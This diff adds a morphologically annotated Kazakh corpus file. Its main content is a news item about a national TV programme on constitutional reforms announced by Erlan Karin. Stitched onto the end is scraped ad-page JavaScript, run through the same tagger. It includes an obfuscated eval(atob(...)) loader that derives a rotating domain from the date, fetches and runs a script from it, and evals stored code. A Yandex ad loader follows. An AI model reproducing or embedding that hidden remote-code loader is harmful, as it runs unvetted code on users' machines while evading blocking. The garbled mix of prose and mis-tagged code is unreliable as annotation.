@@ -1,0 +1,52 @@
+^Ертең/ертең<adv>$^,/,<cm>$ ^25/25<num>$ ^ақпан/ақпан<n><nom>$ ^күні/күн<n><px3sp><nom>$ ^Ұлттық/ұлттық<adj>$ ^арна/арна<n><nom>$ ^эфирінде/эфир<n><px3sp><loc>$ ^Конституциялық/конституциялық<adj>$ ^реформаларды/реформа<n><pl><acc>$ ^талқылауға/талқыла<v><tv><ger><dat>$ ^арналған/арна<v><tv><pass><gpr_past>$ ^арнайы/арнайы<adj>$ ^бағдарлама/бағдарлама<n><nom>$ ^көрсетілмек/көрсет<v><tv><pass><fut_plan><p3><sg>$^./.<sent>$
+^Бұл/бұл<det><dem>$ ^туралы/туралы<post>$ ^«/«<lquot>$^Қазақстан/Қазақстан<np><top><nom>$^»/»<rquot>$ ^ТРК/*ТРК$ ^басшысы/басшы<n><px3sp><nom>$ ^Ерлан/Ерлан<np><ant><m><nom>$ ^Қарин/*Қарин$ ^хабарлады/хабарла<v><tv><ifi><p3><sg>$^./.<sent>$^./.<sent>$^«/«<lquot>$^Ертең/ертең<adv>$ ^кешкі/кеш<adv><attr>$ ^жаңалықтардан/жаңалық<n><pl><abl>$ ^кейін/кейін<post>$ ^«/«<lquot>$^Қазақстан/Қазақстан<np><top><nom>$^»/»<rquot>$ ^ұлттық/ұлттық<adj>$ ^арнасынан/арна<n><px3sp><abl>$ ^Конституциялық/конституциялық<adj>$ ^реформаларды/реформа<n><pl><acc>$ ^талқылауға/талқыла<v><tv><ger><dat>$ ^арналған/арна<v><tv><pass><gpr_past>$ ^арнайы/арнайы<adj>$ ^бағдарламамызды/бағдарлама<n><px1pl><acc>$ ^көруіңізге/көр<v><tv><ger><px2sg><frm><dat>$ ^болады/бол<v><iv><aor><p3><sg>$^»/»<rquot>$^,/,<cm>$ ^—/—<guio>$ ^дейді/де<v><tv><aor><p3><sg>$ ^Ерлан/Ерлан<np><ant><m><nom>$ ^Қарин/*Қарин$^./.<sent>$^Естеріңізде/Ес<np><ant><m><pl><px2sg><frm><loc>$ ^болса/бол<v><iv><gna_cond><p3><sg>$^,/,<cm>$ ^қаңтар/қаңтар<n><nom>$ ^айының/ай<n><px3sp><gen>$ ^25/25<num>$ ^күні/күн<n><px3sp><nom>$ ^Мемлекет/мемлекет<n><nom>$ ^басшысы/басшы<n><px3sp><nom>$ ^билік/билік<n><nom>$ ^тармақтары/тармақ<n><pl><px3sp><nom>$ ^арасында/ара<n><px3sp><loc>$ ^өкілеттіліктерді/өкілеттілік<n><pl><acc>$ ^қайта/қайта<adv>$ ^бөлуге/бөл<v><tv><ger><dat>$ ^байланысты/байланыс<n><acc>$ ^үндеу/үнде<v><iv><ger><nom>$ ^жариялаған/жарияла<v><tv><gpr_past>$ ^болатын/бол<v><iv><pih><p3><sg>$^./.<sent>$
+^Бұл/бұл<prn><dem><nom>$ ^—/—<guio>$ ^Қазақстан/Қазақстан<np><top><nom>$ ^Республикасының/республика<n><px3sp><gen>$ ^демократиялық/демократиялық<adj>$ ^мемлекет/мемлекет<n><nom>$ ^болуға/бол<v><iv><ger><dat>$ ^талпынысы/талпыныс<n><px3sp><nom>+е<cop><aor><p3><sg>$^./.<sent>$
+^Ал/ал<cnjcoo>$ ^мұндай/бұл<prn><dem><sim><nom>$ ^ел/ел<n><nom>$ ^тағдырына/тағдыр<n><px3sp><dat>$ ^қатысты/қатысты<adj>$ ^өзгерістерден/өзгеріс<n><pl><abl>$ ^қалыс/қалыс<adj>$ ^қалуға/қал<v><iv><ger><dat>$ ^болмайды/бол<v><iv><neg><aor><p3><sg>$^./.<sent>$
+^Халыққа/халық<n><dat>$ ^дұрыс/дұрыс<adj>$ ^ақпарат/ақпарат<n><nom>$ ^берілуі/бер<v><tv><pass><ger><px3sp><nom>$ ^керек/керек<adj>+е<cop><aor><p3><sg>$^./.<sent>$
+^Ұлттық/ұлттық<adj>$ ^арнаның/арна<n><gen>$ ^бұл/бұл<det><dem>$ ^бастамасы/бастама<n><px3sp><nom>$ ^құптарлық/құпта<v><tv><gpr_ppot><nom>$^./.<sent>$
+^Мұны/бұл<prn><dem><acc>$ ^желі/желі<n><nom>$ ^қолданушылары да/қолданушы<n><pl><px3sp><nom>+да<cnjcoo>$ ^қостап/қоста<v><tv><prc_perf>$ ^отыр/отыр<vaux><pres><p3><sg>$^./.<sent>$^./.<sent>$^«/«<lquot>$^Ерлан/Ерлан<np><ant><m><nom>$ ^Қарин/*Қарин$ ^барған/бар<v><iv><gpr_past>$ ^әр/әр<det><qnt>$ ^салада/сала<n><loc>$ ^сүбелі/*сүбелі$ ^істер/істе<v><iv><gpr_fut>$ ^қолға/қол<n><dat>$ ^алынып/ал<v><tv><pass><gna_perf>$^,/,<cm>$ ^құптар/құпта<v><tv><gpr_fut>$ ^қадам/қадам<n><nom>$ ^жасалады/жаса<v><tv><pass><aor><p3><sg>$^./.<sent>$
+^Ертең/ертең<adv>$ ^Е/е<ij>$^./.<sent>$^Қариннің/*Қариннің$ ^жаңа/жаңа<adj>$ ^қызметіндегі/қызмет<n><px3sp><loc><attr>$ ^алғашқы/алғаш<adv><attr>$ ^жобасы/жоба<n><px3sp><nom>$ ^экранға/экран<n><dat>$ ^шықпақ/шық<v><tv><fut_plan><p3><sg>$^./.<sent>$
+^Өзекті/өзекті<adj>$ ^тақырып/тақырып<n><nom>$^,/,<cm>$ ^орақ/орақ<n><nom>$ ^тілді/тілді<adj>$ ^спикерлердің/спикер<n><pl><gen>$ ^қатысуымен/қатыс<v><iv><ger><px3sp><ins>$ ^талқыланбақ/талқыла<v><tv><pass><prc_fplan>$^»/»<rquot>$^,/,<cm>$^-/х<guio>$^дейді/де<v><tv><aor><p3><sg>$ ^олар/ол<prn><dem><pl><nom>+е<cop><aor><p3><sg>$^./.<sent>$^./.<sent>$^Бөлісіңіз/бөліс<n><px2sg><frm><nom>$^:/:<sent>$
+
+
+
+
+
+
+ 
+          ^var/*var$ ^node4990/*node4990$ = ^document/*document$^./.<sent>$^getElementById/*getElementById$^(/(<lpar>$^"/"<sent>$^MIXADV/*MIXADV$_^4990/4990<num>$^"/"<sent>$^)/)<rpar>$^;/;<sent>$
+          ^if/*if$^(/(<lpar>$ ^node4990/*node4990$ ^)/)<rpar>$
+          {
+               ^var/*var$ ^script/*script$ = ^document/*document$^./.<sent>$^createElement/*createElement$^(/(<lpar>$^"/"<sent>$^script/*script$^"/"<sent>$^)/)<rpar>$^;/;<sent>$
+               ^script/*script$^./.<sent>$^charset/*charset$ = ^"/"<sent>$^utf/*utf$^-/х<guio>$^8/8<num>$^"/"<sent>$^;/;<sent>$
+               ^script/*script$^./.<sent>$^src/*src$ = ^"/"<sent>$^https/*https$^:/:<sent>$^///<sent>$^///<sent>$^m/*m$^./.<sent>$^mixadvert/*mixadvert$^./.<sent>$^com/*com$^///<sent>$^show/*show$^///<sent>$^?/?<sent>$^id/*id$=^4990/4990<num>$&^r/*r$=^"/"<sent>$+^Math/Math<np><unk>$^./.<sent>$^random/*random$^(/(<lpar>$^)/)<rpar>$^;/;<sent>$
+               ^node4990/*node4990$^./.<sent>$^parentNode/*parentNode$^./.<sent>$^appendChild/*appendChild$^(/(<lpar>$^script/*script$^)/)<rpar>$^;/;<sent>$ 
+               ^script/*script$^./.<sent>$^onerror/*onerror$ = ^function/*function$^(/(<lpar>$^)/)<rpar>${
+                  ^window/*window$^./.<sent>$^eval/*eval$^(/(<lpar>$ ^atob/*atob$^(/(<lpar>$^"/"<sent>$^dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg/*dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg$^"/"<sent>$^)/)<rpar>$ ^)/)<rpar>$^;/;<sent>$
+              }
+          }
+          
+
+
+
+
+    ^(/(<lpar>$^function/*function$^(/(<lpar>$^w/*w$^,/,<cm>$ ^d/*d$^,/,<cm>$ ^n/*n$^,/,<cm>$ ^s/*s$^,/,<cm>$ ^t/*t$^)/)<rpar>$ {
+        ^w/*w$^[/[<lpar>$^n/*n$^]/]<rpar>$ = ^w/*w$^[/[<lpar>$^n/*n$^]/]<rpar>$ || ^[/[<lpar>$^]/]<rpar>$^;/;<sent>$
+        ^w/*w$^[/[<lpar>$^n/*n$^]/]<rpar>$^./.<sent>$^push/*push$^(/(<lpar>$^function/*function$^(/(<lpar>$^)/)<rpar>$ {
+            ^Ya/Ya<np><unk>$^./.<sent>$^Context/Context<np><unk>$^./.<sent>$^AdvManager/Advmanager<np><unk>$^./.<sent>$^render/*render$^(/(<lpar>${
+                ^blockId/*blockId$^:/:<sent>$ ^"/"<sent>$^R/R<np><unk>$^-/х<guio>$^A/A<np><unk>$^-/х<guio>$^241735/241735<num>$^-/х<guio>$^5/5<num>$^"/"<sent>$^,/,<cm>$
+                ^renderTo/*renderTo$^:/:<sent>$ ^"/"<sent>$^yandex/*yandex$_^rtb/*rtb$_^R/R<np><unk>$^-/х<guio>$^A/A<np><unk>$^-/х<guio>$^241735/241735<num>$^-/х<guio>$^5/5<num>$^"/"<sent>$^,/,<cm>$
+                ^async/*async$^:/:<sent>$ ^true/*true$
+            }^)/)<rpar>$^;/;<sent>$
+        }^)/)<rpar>$^;/;<sent>$
+        ^t/*t$ = ^d/*d$^./.<sent>$^getElementsByTagName/*getElementsByTagName$^(/(<lpar>$^"/"<sent>$^script/*script$^"/"<sent>$^)/)<rpar>$^[/[<lpar>$^0/0<num>$^]/]<rpar>$^;/;<sent>$
+        ^s/*s$ = ^d/*d$^./.<sent>$^createElement/*createElement$^(/(<lpar>$^"/"<sent>$^script/*script$^"/"<sent>$^)/)<rpar>$^;/;<sent>$
+        ^s/*s$^./.<sent>$^type/*type$ = ^"/"<sent>$^text/*text$^///<sent>$^javascript/*javascript$^"/"<sent>$^;/;<sent>$
+        ^s/*s$^./.<sent>$^src/*src$ = ^"/"<sent>$^///<sent>$^///<sent>$^an/*an$^./.<sent>$^yandex/*yandex$^./.<sent>$^ru/*ru$^///<sent>$^system/*system$^///<sent>$^context/*context$^./.<sent>$^js/*js$^"/"<sent>$^;/;<sent>$
+        ^s/*s$^./.<sent>$^async/*async$ = ^true/*true$^;/;<sent>$
+        ^t/*t$^./.<sent>$^parentNode/*parentNode$^./.<sent>$^insertBefore/*insertBefore$^(/(<lpar>$^s/*s$^,/,<cm>$ ^t/*t$^)/)<rpar>$^;/;<sent>$
+    }^)/)<rpar>$^(/(<lpar>$^this/*this$^,/,<cm>$ ^this/*this$^./.<sent>$^document/*document$^,/,<cm>$ ^"/"<sent>$^yandexContextAsyncCallbacks/*yandexContextAsyncCallbacks$^"/"<sent>$^)/)<rpar>$^;/;<sent>$
+
+
+
+^./.<sent>$
